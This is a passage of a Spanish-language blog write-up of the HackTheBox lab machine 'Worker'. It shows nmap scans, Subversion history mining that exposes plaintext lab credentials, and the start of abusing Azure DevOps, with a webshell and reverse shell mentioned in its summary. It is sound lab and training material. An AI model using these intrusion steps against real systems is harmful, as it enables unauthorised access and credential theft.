@@ -1,0 +1,1869 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Worker</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Worker | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Worker" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores." />
+<meta property="og:description" content="Máquina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores." />
+<link rel="canonical" href="http://localhost:4000/htb/worker" />
+<meta property="og:url" content="http://localhost:4000/htb/worker" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-01-30T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270banner.png" />
+<meta property="twitter:title" content="HackTheBox - Worker" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-01-30T00:00:00-08:00","datePublished":"2021-01-30T00:00:00-08:00","description":"Máquina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores.","headline":"HackTheBox - Worker","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/worker"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/worker"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Worker</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-01-30">30 Jan 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270banner.png" alt="HackTheBox - Worker">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/workerHTB.png" alt="workerHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p>Creador: <a href="https://www.hackthebox.eu/profile/222808">ekenas</a>.</p>
+
+<p>Linda maquina eh!</p>
+
+<p>Empezaremos enumerando repositorios, nos copiaremos uno que está siendo mantenido como <code>dimensión.worker.htb</code>, esto hecho con la herramienta <code>svn</code> (que es uno de los servicios que tenemos corriendo). Jugando con los argumentos usaremos uno para ver los <code>commits</code> (un log de ellos) para así obtener un usuario: <code>nathen</code>. Después usaremos otro argumento para ver detalladamente cada commit, de ahí obtendremos la contraseña del usuario, con esas credenciales lograremos entrar a un nuevo dominio: <code>devops.worker.htb</code>.</p>
+
+<p>Estando dentro haremos <code>commit</code> para subir una webshell. Con ella generaremos una reverse Shell.
+Con enumeración básica encontraremos (casi que no) un disco nuevo: <code>w:\</code>. De ahí obtendremos las credenciales del usuario <code>robisl</code>. Con ellas podemos entrar al sistema con <code>evil-winrm</code> y también a <code>devops.worker.htb</code>.</p>
+
+<p>Usaremos una funcionalidad de <code>Azure DevOps</code> que nos permite ejecutar comandos en el sistema como “tareas”. Nos daremos cuenta de que se están ejecutando como administrador. Aprovecharemos esa locura para obtener una reverse Shell. O bueno, algo parecido (:</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina.</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Vamos a ensuciarnos un poco y trepa a la realidad.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto).</p>
+</blockquote>
+
+<p>Démosle candela. Tendremos como siempre 3 fases:</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a></li>
+  <li><a href="#explotacion">Explotación</a></li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Empezaremos realizando un escaneo de puertos sobre la máquina para saber que servicios está corriendo.</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v -Pn 10.10.10.203
+</code></pre>
+
+<p>En este caso vamos a agregarle el parámetro <code>-T</code> para hacer el escaneo más rápido.</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v -Pn -T5 10.10.10.203
+</code></pre>
+
+<p>Aún sigue lento, cambiemos el <code>-T</code> por <code>--min-rate</code>:</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v -Pn --min-rate=2000 10.10.10.203 -oG initScan
+</code></pre>
+
+<p>Perfecto va mucho más rápido.</p>
+
+<blockquote>
+  <p><strong>Es importante hacer un escaneo total, sin cambios ni parametros de más, asi vaya lento, que nos permita ver si obviamos/pasamos algún puerto</strong>.</p>
+  <pre><code class="language-sh">–» nmap -p- --open -v -Pn 10.10.10.203 -oG totalScan
+</code></pre>
+</blockquote>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, como <strong>ping</strong> (P) y el <strong>DNS</strong> (n)</td>
+    </tr>
+    <tr>
+      <td>-T</td>
+      <td style="text-align: left">Forma de escanear súper rápido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al número que pongamos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat initScan 
+# Nmap 7.80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.203
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.203 ()   Status: Up
+Host: 10.10.10.203 ()   Ports: 80/open/tcp//http///, 3690/open/tcp//svn///, 5985/open/tcp//wsman///     Ignored State: filtered (65532)
+# Nmap done at Mon Nov 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 162.46 seconds
+</code></pre>
+
+<p>Muy bien, tenemos los siguientes servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong>HTTP</strong>: Servidor web</td>
+    </tr>
+    <tr>
+      <td>3690</td>
+      <td style="text-align: left"><strong>SVN</strong>: Aún no lo sabemos</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td style="text-align: left"><strong>WSMan (WinRM)</strong>: <a href="https://en.wikipedia.org/wiki/WS-Management">Protocolo basado en SOAP para la administración de servidores, dispositivos, aplicaciones y diversos servicios web.</a>)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:</p>
+
+<pre><code class="language-bash">–» nmap -p 80,3690,5985 -sC -sV 10.10.10.203 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat portScan 
+# Nmap 7.80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p 80,3690,5985 -sC -sV -oN portScan 10.10.10.203
+Nmap scan report for 10.10.10.203
+Host is up (0.19s latency).
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+
+<p>Tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: center">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: center">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3690</td>
+      <td style="text-align: center"><a href="http://svnbook.red-bean.com/es/1.0/svn-ch-6-sect-3.html"><strong>svnserve</strong></a></td>
+      <td style="text-align: left">Subversion</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">5985</td>
+      <td style="text-align: center">HTTP</td>
+      <td style="text-align: left">Microsoft HTTPAPI (SSDP/UPnP)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Listo, demosle e investiguemos más sobre cada servicio.</p>
+
+<p>…</p>
+
+<h4 id="puerto-80">• Puerto 80 <a href="#puerto-80">⌖</a></h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pageport80.png" alt="270pageport80" /></p>
+
+<p>Solo nos muestra esto, si damos click en la imagen nos lleva a otro dominio fuera de la máquina (relacionado con documentación), por ahora nos enfocaremos solo en esta página. Podemos intentar hacer fuzzing de directorios a ver si encontramos algo, pero Nelson, no obtenemos nada. Miremos otro servicio mientras tanto…</p>
+
+<h4 id="puerto-3690">• Puerto 3690 <a href="#puerto-3690">⌖</a></h4>
+
+<p>Buscando que hace <a href="http://svnbook.red-bean.com/en/1.7/svn.ref.svnserve.html">svn</a> tenemos que es una herramienta que nos permite el control de versiones de <a href="https://es.wikipedia.org/wiki/Subversion_(software)">Subversion</a>.</p>
+
+<p>Perfecto, encontré <a href="https://www.csoft.net/docs/svnserve.html">esta guia</a> que nos indica el uso de <code>svn</code> entre ellas nos muestra como “probar” el funcionamiento del repositorio generando una copia del mismo.</p>
+
+<blockquote>
+  <p>To test the server’s functionality, you can create a working copy of your repository using your shell. The <code>checkout</code> command will create a working copy of the repository. <a href="https://www.csoft.net/docs/svnserve.html">CSoft</a></p>
+</blockquote>
+
+<p>Tendríamos:</p>
+
+<blockquote>
+  <p>svn co svn://your-domain.com/$HOME/my-repo my-working-dir</p>
+</blockquote>
+
+<p>En nuestro caso quedaría así:</p>
+
+<pre><code class="language-bash">–» svn co svn://10.10.10.203/ repository_copy/
+A    repository_copy/dimension.worker.htb
+A    repository_copy/dimension.worker.htb/LICENSE.txt
+A    repository_copy/dimension.worker.htb/README.txt
+A    repository_copy/dimension.worker.htb/assets
+A    repository_copy/dimension.worker.htb/assets/css
+A    repository_copy/dimension.worker.htb/assets/css/fontawesome-all.min.css
+A    repository_copy/dimension.worker.htb/assets/css/main.css
+A    repository_copy/dimension.worker.htb/assets/css/noscript.css
+A    repository_copy/dimension.worker.htb/assets/js
+A    repository_copy/dimension.worker.htb/assets/js/breakpoints.min.js
+A    repository_copy/dimension.worker.htb/assets/js/browser.min.js
+A    repository_copy/dimension.worker.htb/assets/js/jquery.min.js
+A    repository_copy/dimension.worker.htb/assets/js/main.js
+A    repository_copy/dimension.worker.htb/assets/js/util.js
+A    repository_copy/dimension.worker.htb/assets/sass
+A    repository_copy/dimension.worker.htb/assets/sass/base
+A    repository_copy/dimension.worker.htb/assets/sass/base/_page.scss
+A    repository_copy/dimension.worker.htb/assets/sass/base/_reset.scss
+A    repository_copy/dimension.worker.htb/assets/sass/base/_typography.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components
+A    repository_copy/dimension.worker.htb/assets/sass/components/_actions.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_box.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_button.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_form.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_icon.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_icons.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_image.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_list.scss
+A    repository_copy/dimension.worker.htb/assets/sass/components/_table.scss
+A    repository_copy/dimension.worker.htb/assets/sass/layout
+A    repository_copy/dimension.worker.htb/assets/sass/layout/_bg.scss
+A    repository_copy/dimension.worker.htb/assets/sass/layout/_footer.scss
+A    repository_copy/dimension.worker.htb/assets/sass/layout/_header.scss
+A    repository_copy/dimension.worker.htb/assets/sass/layout/_main.scss
+A    repository_copy/dimension.worker.htb/assets/sass/layout/_wrapper.scss
+A    repository_copy/dimension.worker.htb/assets/sass/libs
+A    repository_copy/dimension.worker.htb/assets/sass/libs/_breakpoints.scss
+A    repository_copy/dimension.worker.htb/assets/sass/libs/_functions.scss
+A    repository_copy/dimension.worker.htb/assets/sass/libs/_mixins.scss
+A    repository_copy/dimension.worker.htb/assets/sass/libs/_vars.scss
+A    repository_copy/dimension.worker.htb/assets/sass/libs/_vendor.scss
+A    repository_copy/dimension.worker.htb/assets/sass/main.scss
+A    repository_copy/dimension.worker.htb/assets/sass/noscript.scss
+A    repository_copy/dimension.worker.htb/assets/webfonts
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.eot
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.svg
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.woff
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.eot
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.svg
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.woff
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.eot
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.svg
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.woff
+A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
+A    repository_copy/dimension.worker.htb/images
+A    repository_copy/dimension.worker.htb/images/bg.jpg
+A    repository_copy/dimension.worker.htb/images/overlay.png
+A    repository_copy/dimension.worker.htb/images/pic01.jpg
+A    repository_copy/dimension.worker.htb/images/pic02.jpg
+A    repository_copy/dimension.worker.htb/images/pic03.jpg
+A    repository_copy/dimension.worker.htb/index.html
+A    repository_copy/moved.txt
+Revisión obtenida: 5
+–» ls repository_copy/
+dimension.worker.htb  moved.txt
+</code></pre>
+
+<p>Perfecto, tenemos una copia del repositorio en nuestra máquina, démosle un vistazo a ver que podemos obtener:</p>
+
+<ul>
+  <li>Nos muestra lo que parece ser el dominio al que resuelve ese repositorio: <code>dimension.worker.htb</code>.</li>
+  <li>Otro dominio e información extra en el archivo <code>moved.txt</code>.</li>
+</ul>
+
+<pre><code class="language-bash">–» cat moved.txt 
+This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :)
+</code></pre>
+
+<p>Pues vamos a tener que jugar con el archivo <code>/etc/hosts</code> para que al entrar a la dirección <code>10.10.10.203</code> nos resuelva a los dominios <code>dimension.worker.htb</code> y <code>devops.worker.htb</code> que al parecer son los que realmente están siendo mantenidos por el equipo <strong>Worker</strong>.</p>
+
+<pre><code class="language-bash">–» cat /etc/hosts
+...
+10.10.10.203  dimension.worker.htb devops.worker.htb
+...
+</code></pre>
+
+<p>Podemos probar nuevamente en la web pero ahora indicándole el dominio <code>dimension.worker.htb</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedimensionworker.png" alt="270pagedimensionworker" /></p>
+
+<p>Y con <code>devops.worker.htb</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsworker.png" alt="270pagedevopsworker" /></p>
+
+<p>Pues nada, démosle a <code>dimension</code> a ver si logramos obtener un usuario para poder entrar en <code>devops</code>.</p>
+
+<p>Si entramos a <code>work</code> nos muestra lo que parecen ser varios vHost, si ponemos el mouse encima (no pude hacer que se viera en la imagen :P) nos muestra estas URL’s:</p>
+
+<ul>
+  <li>alpha.worker.htb</li>
+  <li>cartoon.worker.htb</li>
+  <li>lens.worker.htb</li>
+  <li>solid-state.worker.htb</li>
+  <li>spectral.worker.htb</li>
+  <li>story.worker.htb</li>
+</ul>
+
+<p>Puede ser un gran (gran) rabbit hole, pero igual quiero probar si obtenemos algo. Agreguémoslos al <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">–» cat /etc/hosts
+...
+10.10.10.203  dimension.worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb
+...
+</code></pre>
+
+<p>Bueno, no fue tanto tiempo perdido, les di una ojeada rápida por si veía algo interesante pero no, nada llamativo.</p>
+
+<p>Seguí buscando información sobre <code>svn</code> y después de un rato entendí varios de sus comandos:</p>
+
+<p>Podemos ver los logs del repositorio:</p>
+
+<pre><code class="language-bash">–» svn log svn://10.10.10.203/
+------------------------------------------------------------------------
+r5 | nathen | 2020-06-20 08:52:00 -0500 (sáb 20 de jun de 2020) | 1 línea
+
+Added note that repo has been migrated
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 08:50:20 -0500 (sáb 20 de jun de 2020) | 1 línea
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+r3 | nathen | 2020-06-20 08:46:19 -0500 (sáb 20 de jun de 2020) | 1 línea
+
+-
+------------------------------------------------------------------------
+r2 | nathen | 2020-06-20 08:45:16 -0500 (sáb 20 de jun de 2020) | 1 línea
+
+Added deployment script
+------------------------------------------------------------------------
+r1 | nathen | 2020-06-20 08:43:43 -0500 (sáb 20 de jun de 2020) | 1 línea
+
+First version
+------------------------------------------------------------------------
+</code></pre>
+
+<ul>
+  <li>Podemos decirle que haga un <code>verbose</code> para que sea más explicito con la info:</li>
+</ul>
+
+<pre><code class="language-bash">–» svn log -v svn://10.10.10.203/
+------------------------------------------------------------------------
+r5 | nathen | 2020-06-20 08:52:00 -0500 (sáb 20 de jun de 2020) | 1 línea
+Rutas cambiadas:
+   A /moved.txt
+
+Added note that repo has been migrated
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 08:50:20 -0500 (sáb 20 de jun de 2020) | 1 línea
+Rutas cambiadas:
+   D /deploy.ps1
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+r3 | nathen | 2020-06-20 08:46:19 -0500 (sáb 20 de jun de 2020) | 1 línea
+Rutas cambiadas:
+   M /deploy.ps1
+
+-
+------------------------------------------------------------------------
+r2 | nathen | 2020-06-20 08:45:16 -0500 (sáb 20 de jun de 2020) | 1 línea
+Rutas cambiadas:
+   A /deploy.ps1
+
+Added deployment script
+------------------------------------------------------------------------
+r1 | nathen | 2020-06-20 08:43:43 -0500 (sáb 20 de jun de 2020) | 1 línea
+Rutas cambiadas:
+   A /dimension.worker.htb
+   A /dimension.worker.htb/LICENSE.txt
+   A /dimension.worker.htb/README.txt
+   A /dimension.worker.htb/assets
+   A /dimension.worker.htb/assets/css
+   A /dimension.worker.htb/assets/css/fontawesome-all.min.css
+   A /dimension.worker.htb/assets/css/main.css
+   A /dimension.worker.htb/assets/css/noscript.css
+   A /dimension.worker.htb/assets/js
+   A /dimension.worker.htb/assets/js/breakpoints.min.js
+   A /dimension.worker.htb/assets/js/browser.min.js
+   A /dimension.worker.htb/assets/js/jquery.min.js
+...
+... #Todos los archivos que nos copio antes del repositorio.
+...
+</code></pre>
+
+<p>Vemos una traza de la fecha, hora, el ID de cada log (r*), el usuario y que se hizo (que contenía el <strong>commit</strong>). En los logs <code>r2, r3 y r4</code> hay un archivo llamado <code>deploy.ps1</code> que según la descripción era (lo borraron en el commit 4) un script para desplegar me imagino que todo el entorno o herramientas necesarias.</p>
+
+<ul>
+  <li>Tenemos un usuario: <code>nathen</code>.</li>
+</ul>
+
+<p>Encontré <a href="http://svnbook.red-bean.com/en/1.7/svn.tour.revs.specifiers.html#svn.tour.revs.keywords">como podemos ver que cambio se realizó en cada <strong>commit</strong></a> o <a href="http://svnbook.red-bean.com/es/1.0/svn-ch-3-sect-3.html">acá también</a> (si es que hicieron algún cambio):</p>
+
+<pre><code class="language-bash">–» svn diff svn://10.10.10.203/
+svn: E195002: No se especificaron todas las revisiones requeridas
+</code></pre>
+
+<p>Con <code>-r</code> le pasamos cuál <strong>commit</strong> queremos revisar (también se puede poner un rango). Revisemos el <code>2</code> que fue cuando se agregó el archivo <code>deploy.ps1</code>.</p>
+
+<pre><code class="language-bash">–» svn diff -r2 svn://10.10.10.203/
+Index: deploy.ps1
+===================================================================
+--- deploy.ps1  (revisión: 2)
++++ deploy.ps1  (nonexistent)
+@@ -1,6 +0,0 @@
+-$user = "nathen" 
+-$plain = "wendel98"
+-$pwd = ($plain | ConvertTo-SecureString)
+-$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+-$args = "Copy-Site.ps1"
+-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+</code></pre>
+
+<p>Opa, tenemos unas posibles credenciales. En el siguiente commit se arrepiente de lo que subio :(:</p>
+
+<pre><code class="language-bash">–» svn diff -r3 svn://10.10.10.203/
+Index: deploy.ps1
+===================================================================
+--- deploy.ps1  (revisión: 3)
++++ deploy.ps1  (nonexistent)
+@@ -1,7 +0,0 @@
+-$user = "nathen" 
+-# NOTE: We cant have my password here!!!
+-$plain = ""
+-$pwd = ($plain | ConvertTo-SecureString)
+-$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+-$args = "Copy-Site.ps1"
+-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+\ No newline at end of file
+</code></pre>
+
+<p>Pero da igual, ya quedo la traza. <code>nathen:wendel98</code>. Probemos ingresando con ellas a <code>devops.worker.htb</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsin.png" alt="270pagedevopsin" /></p>
+
+<p>Perfecto, enumeremos el servicio <code>Azure Devops</code>.</p>
+
+<p>Una <a href="https://medium.com/edureka/azure-devops-cf755fb334ae">explicacion muy buena de Azure Devops</a> y <a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/get-started/key-pipelines-concepts?view=azure-devops">un documento</a> que resume cada apartado.</p>
+
+<p>Después de mucha lectura sobre, <code>pipelines</code>, <code>builds</code> y demás cositas, entendí la estructura y flujo.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Inicialmente había probado simplemente en uno de los <strong>repositorios</strong> agregar un archivo y hacer un <code>commit</code>, pero obtenía el siguiente error:</p>
+
+<pre><code class="language-html">TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.
+</code></pre>
+
+<p>Pase de él y seguí buscando formas de lograr algo… Paso mucho tiempo :P y no encontré nada. Volví a intentar hacer un commit para subir un archivo desde la web, salió el mismo error, pero ahora lo busque en internet, encontré esto:</p>
+
+<ul>
+  <li><a href="https://www.freshbrewed.science/azure-devops-vsts-security-and-policies-part-2/index.html">https://www.freshbrewed.science/azure-devops-vsts-security-and-policies-part-2/index.html</a></li>
+</ul>
+
+<p>El problema es de políticas y claramente por seguridad, pero el artículo nos enseña una manera de remediarlo en la que clonaremos el repositorio, agregaremos el archivo, obtendremos el error, nos crearemos una nueva rama, haremos el <code>push</code> hacia el repositorio, iremos a la web en donde nos mostrara que alguien quiere hacer un commit, le daremos la opción de generar un <code>pull request</code> y con la misma web permitiremos que se genere el <code>push</code>. Veamos:</p>
+
+<p>Primero nos posicionamos en el repositorio que queramos para obtener el link y posteriormente clonarlo (se acuerdan los dominios que obtuvimos antes, pues ellos están acá), usaré <code>lens</code> inicialmente:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsrepolens.png" alt="270pagedevopsrepolens" /></p>
+
+<pre><code class="language-bash">–» git clone http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
+Clonando en 'lens'...
+Username for 'http://devops.worker.htb': nathen
+Password for 'http://nathen@devops.worker.htb': 
+remote: Azure Repos
+remote: Found 96 objects to send. (2 ms)
